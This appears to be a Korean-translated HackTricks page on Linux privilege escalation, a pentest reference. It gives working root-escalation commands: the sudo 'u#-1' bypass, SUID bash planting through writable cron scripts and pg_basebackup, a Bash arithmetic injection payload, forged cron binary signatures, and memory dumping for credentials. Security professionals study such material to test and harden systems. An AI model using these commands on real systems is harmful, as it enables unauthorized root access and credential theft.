# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 시스템 정보

### OS 정보

이제 실행 중인 OS에 대한 정보를 수집해보자.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

만약 당신이 **`PATH` 변수 안의 어떤 폴더에 대해 write permissions를 가지고 있다면**, 일부 libraries나 binaries를 hijack할 수 있습니다:
```bash
echo $PATH
```
### Env 정보

흥미로운 정보나 passwords 또는 API keys가 environment variables에 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel 버전을 확인하고, escalate privileges에 사용할 수 있는 exploit가 있는지 확인하세요.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
좋은 취약한 kernel 목록과 일부 이미 **compiled exploits**를 여기에서 찾을 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\  
다음 사이트들에서도 일부 **compiled exploits**를 찾을 수 있습니다: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

해당 웹에서 모든 취약한 kernel 버전을 추출하려면 다음을 수행할 수 있습니다:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
커널 익스플로잇을 검색하는 데 도움이 될 수 있는 도구는 다음과 같습니다:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim에서 실행 — kernel 2.x용 exploit만 검사)

항상 **Google에서 커널 버전을 검색**하세요. 귀하의 커널 버전이 어떤 kernel exploit에 명시되어 있을 수 있으며, 그러면 해당 exploit이 유효한지 확신할 수 있습니다.

추가적인 kernel exploitation 기법:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

다음에 나타나는 취약한 Sudo 버전을 기반으로:
```bash
searchsploit sudo
```
이 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo 버전이 1.9.17p1 이전인 경우 (**1.9.14 - 1.9.17 < 1.9.17p1**), 사용자 제어 디렉터리에서 `/etc/nsswitch.conf` 파일을 사용할 때 sudo `--chroot` 옵션을 통해 비특권 로컬 사용자가 권한을 root로 상승시킬 수 있습니다.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

출처: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

**smasher2 box of HTB**에서 이 vuln이 어떻게 악용될 수 있는지에 대한 **example**을 확인하세요.
```bash
dmesg 2>/dev/null | grep "signature"
```
### 더 많은 시스템 enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어 수단 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

만약 docker container 안에 있다면 그곳에서 탈출을 시도할 수 있습니다:


{{#ref}}
docker-security/
{{#endref}}

## 드라이브

**무엇이 마운트되어 있고 무엇이 언마운트되어 있는지**, 어디에 있고 왜 그런지 확인하세요. 만약 어떤 것이 언마운트되어 있다면 그것을 마운트해서 민감한 정보를 확인해 볼 수 있습니다
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리 나열
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한 **any compiler is installed**인지 확인하세요. 일부 kernel exploit을 사용해야 할 경우 유용하며, 해당 exploit은 사용하려는 머신(또는 유사한 머신)에서 compile하는 것이 권장됩니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 설치된 취약 소프트웨어

**설치된 패키지와 서비스의 버전**을 확인하세요. 예를 들어 오래된 Nagios 버전이 있어 권한 상승에 악용될 수 있습니다…\
더 의심스러운 설치된 소프트웨어의 버전은 수동으로 확인하는 것이 권장됩니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _이 명령어들은 대부분 쓸모없는 많은 정보를 출력하므로, 설치된 소프트웨어 버전이 알려진 익스플로잇에 취약한지 검사해주는 OpenVAS 같은 애플리케이션을 사용하는 것이 권장됩니다_

## 프로세스

어떤 **프로세스들**이 실행되고 있는지 살펴보고, 어떤 프로세스가 **정상적으로 가져야 할 것보다 더 많은 권한을 가지고 있는지** 확인하세요 (예: tomcat이 root로 실행되는 경우?)
```bash
ps aux
ps -ef
top -n 1
```
항상 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md)을 확인하세요. **Linpeas**는 프로세스 명령행에서 `--inspect` 파라미터를 확인하여 이를 탐지합니다.\
또한 **프로세스 binaries에 대한 권한을 확인하세요**, 어쩌면 누군가의 바이너리를 덮어쓸 수 있을지도 모릅니다.

### 프로세스 모니터링

[**pspy**](https://github.com/DominicBreuker/pspy)와 같은 도구를 사용해 프로세스를 모니터링할 수 있습니다. 이는 취약한 프로세스가 자주 실행되거나 특정 요구 조건이 충족될 때 이를 식별하는 데 매우 유용할 수 있습니다.

### 프로세스 메모리

서버의 일부 서비스는 **메모리 내부에 평문 형태로 credentials를 저장**합니다.\
보통 다른 사용자의 프로세스 메모리를 읽으려면 **root privileges**가 필요하므로, 이는 이미 root인 상태에서 추가적인 credentials를 찾을 때 더 유용합니다.\
하지만 **일반 사용자로서 자신이 소유한 프로세스의 메모리는 읽을 수 있다는 것**을 기억하세요.

> [!WARNING]
> 현재 대부분의 머신은 **기본적으로 ptrace를 허용하지 않습니다**, 즉 권한이 없는 사용자가 소유한 다른 프로세스를 덤프할 수 없습니다.
>
> 파일 _**/proc/sys/kernel/yama/ptrace_scope**_ 는 ptrace 접근성을 제어합니다:
>
> - **kernel.yama.ptrace_scope = 0**: 같은 uid를 가진 경우 모든 프로세스를 디버깅할 수 있습니다. 이것이 전통적인 ptracing 동작 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: 부모 프로세스만 디버깅할 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: 관리자만 ptrace를 사용할 수 있습니다(이를 위해서는 CAP_SYS_PTRACE 권한이 필요합니다).
> - **kernel.yama.ptrace_scope = 3**: ptrace로 어떤 프로세스도 추적할 수 없습니다. 일단 설정되면 ptracing을 다시 활성화하려면 재부팅이 필요합니다.

#### GDB

예를 들어 FTP 서비스의 메모리에 접근할 수 있다면 힙(Heap)을 얻어 그 안의 credentials를 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해, **maps가 해당 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되어 있는지를 보여주며**; 또한 **각 매핑된 영역의 권한**을 표시합니다. 해당 **mem** 가상 파일은 **프로세스의 메모리 자체를 노출합니다**. **maps** 파일에서 우리는 어떤 **메모리 영역을 읽을 수 있는지**와 그 오프셋을 알 수 있습니다. 이 정보를 사용해 **mem 파일에서 seek하여 모든 읽을 수 있는 영역을 덤프**하고 이를 파일로 저장합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`는 시스템의 **물리적** 메모리에 접근할 수 있으며, 가상 메모리는 아닙니다. 커널의 가상 주소 공간은 /dev/kmem을 사용해 접근할 수 있습니다.\
일반적으로, `/dev/mem`은 **root**와 **kmem** 그룹만 읽을 수 있습니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump는 Windows용 Sysinternals 도구 모음에 있는 고전적인 ProcDump 도구를 Linux용으로 재구성한 것입니다. Get it in [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 권한 요구를 수동으로 제거하고 자신이 소유한 프로세스를 덤프할 수 있습니다
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root 권한이 필요함)

### 프로세스 메모리에서 자격 증명

#### 수동 예제

authenticator 프로세스가 실행 중인 것을 발견하면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스의 메모리를 덤프할 수 있으며(메모리 덤프 방법은 이전 섹션 참조) 메모리에서 자격 증명을 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)는 메모리에서 **steal clear text credentials from memory**하고 일부 **well known files**에서도 이를 훔칩니다. 제대로 작동하려면 root privileges가 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 예약된/Cron 작업

### Crontab UI (alseambusher)가 root로 실행 중인 경우 – 웹 기반 스케줄러 privesc

웹 “Crontab UI” 패널 (alseambusher/crontab-ui)이 root로 실행되고 loopback에만 바인딩되어 있더라도, SSH local port-forwarding을 통해 접근하여 권한이 있는 작업을 생성해 권한 상승할 수 있다.

일반적인 흐름
- `ss -ntlp` / `curl -v localhost:8000`로 loopback 전용 포트(예: 127.0.0.1:8000)와 Basic-Auth realm을 찾음
- 운영 아티팩트에서 자격증명 찾기:
  - `zip -P <password>`로 비밀번호가 설정된 백업/스크립트
  - systemd unit에서 `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`가 노출됨
- 터널링 및 로그인:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 높은 권한의 job을 생성하고 즉시 실행 (SUID shell을 생성함):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 사용하세요:
```bash
/tmp/rootshell -p   # root shell
```
보안 강화
- Crontab UI를 root로 실행하지 마세요; 전용 사용자와 최소 권한으로 제한하세요
- localhost에 바인딩하고 추가로 firewall/VPN으로 접근을 제한하세요; 비밀번호를 재사용하지 마세요
- unit files에 secrets를 포함하지 마세요; secret stores 또는 root 전용 EnvironmentFile을 사용하세요
- on-demand job 실행에 대해 audit/logging을 활성화하세요

예약된 작업 중 취약한 것이 있는지 확인하세요. root로 실행되는 스크립트를 활용할 수 있을지도 모릅니다 (wildcard vuln? root가 사용하는 파일을 수정할 수 있는가? symlinks를 사용? root가 사용하는 디렉토리에 특정 파일을 생성?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

예를 들어, _/etc/crontab_ 안에서 다음 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user라는 사용자가 /home/user에 대해 쓰기 권한이 있음을 주목하세요_)

이 crontab에서 root 사용자가 PATH를 설정하지 않은 채로 어떤 명령이나 스크립트를 실행하려고 한다면. 예를 들어: _\* \* \* \* root overwrite.sh_\  
그러면, 다음을 사용하여 root 쉘을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron이 script에 wildcard를 사용하는 경우 (Wildcard Injection)

만약 script가 root에 의해 실행되고 명령어 안에 “**\***”가 포함되어 있다면, 이를 악용하여 예기치 않은 동작(예: privesc)을 일으킬 수 있습니다. 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**와일드카드가 다음과 같은 경로 앞에 올 경우** _**/some/path/\***_ **, 취약하지 않습니다 (심지어** _**./\***_ **도 아닙니다).**

다음 페이지를 읽어 와일드카드 악용 트릭을 더 확인하세요:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash는 ((...)), $((...)) 및 let의 산술 평가 전에 parameter/variable expansion과 command substitution을 수행합니다. 만약 root cron/파서가 신뢰할 수 없는 로그 필드를 읽어 이를 산술 컨텍스트에 넣는다면, 공격자는 cron이 실행될 때 root로 실행되는 command substitution $(...)을 주입할 수 있습니다.

- Why it works: Bash에서는 확장이 다음 순서로 발생합니다: parameter/variable expansion, command substitution, arithmetic expansion, 그 다음 word splitting과 pathname expansion. 따라서 `$(/bin/bash -c 'id > /tmp/pwn')0` 같은 값은 먼저 치환되어(명령이 실행됨), 남은 숫자 `0`이 산술에 사용되어 스크립트가 오류 없이 계속됩니다.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 파싱되는 로그에 공격자가 제어하는 텍스트가 기록되도록 하여 숫자처럼 보이는 필드에 command substitution이 포함되고 마지막이 숫자여야 합니다. 명령이 stdout으로 출력하지 않도록(또는 리다이렉트) 하여 산술이 유효하도록 하세요.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root에 의해 실행되는 script가 **directory where you have full access**를 사용한다면, 그 folder를 삭제하고 당신이 제어하는 script를 제공하는 다른 폴더로의 **create a symlink folder to another one**를 생성하는 것이 유용할 수 있습니다
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 심볼릭 링크 검증 및 안전한 파일 처리

경로로 파일을 읽거나 쓰는 권한 있는 scripts/binaries를 검토할 때, 링크가 어떻게 처리되는지 확인하세요:

- `stat()`는 symlink를 따라가 대상의 메타데이터를 반환합니다.
- `lstat()`는 링크 자체의 메타데이터를 반환합니다.
- `readlink -f`와 `namei -l`은 최종 대상을 확인하고 각 경로 구성 요소의 권한을 보여줍니다.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
수비자/개발자를 위해, symlink 트릭에 대한 더 안전한 패턴은 다음을 포함합니다:

- `O_EXCL` with `O_CREAT`: 경로가 이미 존재하면 실패(공격자가 미리 생성해 둔 링크/파일을 차단).
- `openat()`: 신뢰할 수 있는 디렉터리의 파일 디스크립터를 기준으로 작업.
- `mkstemp()`: 보안 권한으로 임시 파일을 원자적으로 생성.

### Custom-signed cron binaries with writable payloads
Blue teams는 때때로 cron으로 동작하는 바이너리를 "sign"하기 위해 커스텀 ELF 섹션을 덤프하고 vendor 문자열을 grep한 후 root로 실행합니다. 해당 바이너리가 group-writable(예: `/opt/AV/periodic-checks/monitor` 소유 `root:devs 770`)이고 signing material을 leak할 수 있다면, 섹션을 위조해 cron 작업을 하이재킹할 수 있습니다:

1. `pspy`를 사용해 검증 흐름을 캡처하세요. Era에서는 root가 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`를 실행한 다음 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`을 수행하고 파일을 실행했습니다.
2. leaked key/config(from `signing.zip`)로 예상되는 인증서를 재생성합니다:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 악성 대체물(예: SUID bash 배포, SSH 키 추가)을 빌드하고 인증서를 `.text_sig`에 임베드하여 grep이 통과하도록 합니다:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 실행 비트를 유지한 채 예정된 바이너리를 덮어씁니다:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 다음 cron 실행을 기다리세요; 단순한 서명 검사가 통과되면 페이로드가 root로 실행됩니다.

### Frequent cron jobs

프로세스를 모니터링하여 1, 2 또는 5분마다 실행되는 프로세스를 찾을 수 있습니다. 이를 활용해 권한 상승을 시도할 수도 있습니다.

예를 들어, **1분 동안 0.1초마다 모니터링**하고, **실행 횟수가 적은 명령으로 정렬**한 뒤 가장 많이 실행된 명령을 삭제하려면, 다음을 실행할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**다음 도구도 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (이 도구는 시작되는 모든 프로세스를 모니터링하고 나열합니다).

### 공격자가 설정한 모드 비트를 보존하는 루트 백업 (pg_basebackup)

If a root-owned cron wraps `pg_basebackup` (or any recursive copy) against a database directory you can write to, you can plant a **SUID/SGID binary** that will be recopied as **root:root** with the same mode bits into the backup output.

Typical discovery flow (as a low-priv DB user):
- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
이는 `pg_basebackup`가 클러스터를 복사할 때 파일 모드 비트를 보존하기 때문에 작동한다; root로 호출되면 대상 파일들은 **root 소유권 + 공격자가 선택한 SUID/SGID**를 상속한다. 권한을 유지하고 실행 가능한 위치에 쓰는 유사한 권한 있는 백업/복사 루틴도 취약하다.

### 보이지 않는 cron jobs

주석 뒤에 carriage return을 넣은 상태(줄바꿈 문자 없이)로 cronjob을 생성할 수 있으며, 이 cron job은 동작한다. 예시 (캐리지 리턴 문자에 주의):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 서비스

### 쓰기 가능한 _.service_ 파일

`.service` 파일을 쓸 수 있는지 확인하세요. 쓸 수 있다면 해당 파일을 **수정해서**, 서비스가 **시작**, **재시작** 또는 **중지**될 때 **백도어를 실행하도록** 만들 수 있습니다(머신을 재부팅해야 할 수도 있습니다).\
예를 들어 .service 파일 안에 백도어를 생성하고 **`ExecStart=/tmp/script.sh`**로 설정하세요.

### 쓰기 가능한 서비스 바이너리

명심하세요: **write permissions over binaries being executed by services**가 있다면, 해당 바이너리를 백도어로 변경할 수 있으며 서비스가 다시 실행될 때 백도어가 실행됩니다.

### systemd PATH - 상대 경로

다음 명령으로 **systemd**가 사용하는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 어떤 폴더에든 **write** 할 수 있다면 **escalate privileges** 할 수 있습니다. 서비스 구성 파일에서 **relative paths being used on service configurations** 같은 항목을 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, 쓸 수 있는 systemd PATH 폴더 안에 상대 경로 바이너리와 같은 이름의 **executable**을 생성하면 서비스가 취약한 동작(**Start**, **Stop**, **Reload**)을 실행하도록 요청될 때 당신의 **backdoor**가 실행됩니다(비권한 사용자는 일반적으로 서비스를 시작/중지할 수 없지만 `sudo -l`을 사용할 수 있는지 확인하세요).

**서비스에 대해 더 알고 싶으면 `man systemd.service`를 참고하세요.**

## **Timers**

**Timers**는 이름이 `**.timer**`로 끝나며 `**.service**` 파일이나 이벤트를 제어하는 systemd 유닛 파일입니다. **Timers**는 캘린더 기반 시간 이벤트 및 단조(monotonic) 시간 이벤트를 기본적으로 지원하고 비동기적으로 실행할 수 있기 때문에 cron의 대안으로 사용할 수 있습니다.

다음 명령으로 모든 타이머를 열거할 수 있습니다:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 타이머

타이머를 수정할 수 있다면 systemd.unit의 일부 유닛(예: `.service` 또는 `.target`)을 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
> 타이머가 만료될 때 활성화할 유닛입니다. 인수는 접미사가 ".timer"가 아닌 유닛 이름입니다. 지정하지 않으면, 이 값은 타이머 유닛과 동일한 이름(접미사만 제외)인 service로 기본 설정됩니다. (위 참조.) 활성화되는 유닛 이름과 타이머 유닛의 이름은 접미사만 제외하고 동일하게 짓는 것이 권장됩니다.

따라서 이 권한을 악용하려면 다음을 수행해야 합니다:

- **쓰기 가능한 바이너리를 실행하는** systemd 유닛(예: `.service`)을 찾는다
- **상대 경로를 실행하는** systemd 유닛을 찾고, 해당 실행 파일을 사칭하기 위해 **systemd PATH**에 대한 **쓰기 권한**을 가진다

**`man systemd.timer`로 타이머에 대해 더 알아보세요.**

### **타이머 활성화**

타이머를 활성화하려면 root 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
참고: **timer**는 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`에 심볼릭 링크를 생성하여 **활성화됩니다**

## 소켓

Unix Domain Sockets (UDS)는 클라이언트-서버 모델에서 동일하거나 다른 머신 간의 **프로세스 통신**을 가능하게 합니다. 이들은 표준 Unix 디스크립터 파일을 사용하여 컴퓨터 간 통신을 수행하며 `.socket` 파일을 통해 설정됩니다.

소켓은 `.socket` 파일을 사용해 구성할 수 있습니다.

**`man systemd.socket`으로 소켓에 대해 더 알아보세요.** 이 파일 안에서는 여러 흥미로운 매개변수를 구성할 수 있습니다:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이 옵션들은 서로 다르지만 요약하면 소켓이 어디에서 수신(listen)할지를 **지정합니다**(AF_UNIX 소켓 파일의 경로, 수신할 IPv4/6 및/또는 포트 번호 등).
- `Accept`: boolean 인수를 받습니다. 만약 **true**면, **각 들어오는 연결마다 서비스 인스턴스가 생성되며** 연결 소켓만 해당 인스턴스에 전달됩니다. 만약 **false**면, 모든 리스닝 소켓 자체가 **시작된 service unit에 전달**되며 모든 연결에 대해 단 하나의 service unit만 생성됩니다. 이 값은 단일 service unit이 모든 들어오는 트래픽을 처리하는 datagram 소켓과 FIFO에서는 무시됩니다. **기본값은 false입니다.** 성능상의 이유로, 새로운 데몬은 `Accept=no`에 적합한 방식으로만 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: 하나 이상의 명령 줄을 받으며, 이는 각각 리스닝 **소켓**/FIFO가 **생성**되고 바인딩되기 전 또는 후에 **실행됩니다**. 명령 줄의 첫 토큰은 절대 경로명이어야 하며, 그 뒤로 프로세스에 전달할 인수가 옵니다.
- `ExecStopPre`, `ExecStopPost`: 리스닝 **소켓**/FIFO가 각각 **닫히고 제거되기 전** 또는 **후**에 **실행되는 추가 명령들**입니다.
- `Service`: 들어오는 트래픽에 대해 **활성화할 service 단위의 이름**을 지정합니다. 이 설정은 Accept=no인 소켓에서만 허용됩니다. 기본적으로 소켓과 동일한 이름을 가진 service(접미사가 대체된)를 사용합니다. 대부분의 경우 이 옵션을 사용할 필요는 없습니다.

### 쓰기 가능한 .socket 파일

